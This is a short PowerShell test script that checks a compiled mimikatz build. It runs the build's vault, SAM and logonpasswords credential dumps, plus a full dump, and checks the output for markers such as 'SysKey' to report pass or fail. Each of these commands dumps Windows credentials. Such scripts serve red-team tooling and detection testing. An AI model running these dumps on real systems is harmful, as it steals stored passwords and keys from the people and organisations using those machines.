# Test if the executable was created
if (Test-Path x64\mimikatz.exe) 
{
	# Vault Test
	$vault_output = (cmd /s /c "x64\mimikatz.exe v")
	
	# Test if mimikatz vault output matches expected
	if ($vault_output -match "Vault : {[a-z0-9\-]+}") 
	{ 
		Write-Output "Vault Test Passed"
	} 
	else 
	{
		Write-Output "Vault Test Failed"
	}
	
	# Test SAM
	$sam_output = (cmd /s /c "x64\mimikatz.exe s")
	
	# Test if mimikatz SAM output matches expected
	if ($sam_output -match "SysKey : [a-z0-9]+") 
	{ 
		Write-Output "SAM Test Passed"
	} 
	else 
	{
		Write-Output "SAM Test Failed"
	}
	
		
	# Test logonpasswords
	$lp_output = (cmd /s /c "x64\mimikatz.exe l")
	
	# Test if mimikatz logonpasswords output matches expected
	# Authentication Id --> run as admin
	# sekurlsa --> not run as admin
	if ($lp_output -match "Authentication Id" -or $lp_output -match "sekurlsa" ) 
	{ 
		Write-Output "logonpasswords Test Passed"
	} 
	else 
	{
		Write-Output "logonpasswords Test Failed"
	}
	
	# Test all types of cred dumps
	$all_output = (cmd /s /c "x64\mimikatz.exe")
	
	# Test if mimikatz output matches expected
	if ($all_output -match "Vault : {[a-z0-9\-]+}" -and $all_output -match "SysKey : [a-z0-9]+" -and ($all_output -match "sekurlsa" -or $all_output -match "Authentication Id"))
	{ 
		Write-Output "Full Test Passed"
	} 
	else 
	{
		Write-Output "Full Test Failed"
	}

}
else
{
	Write-Output "Fail"
}


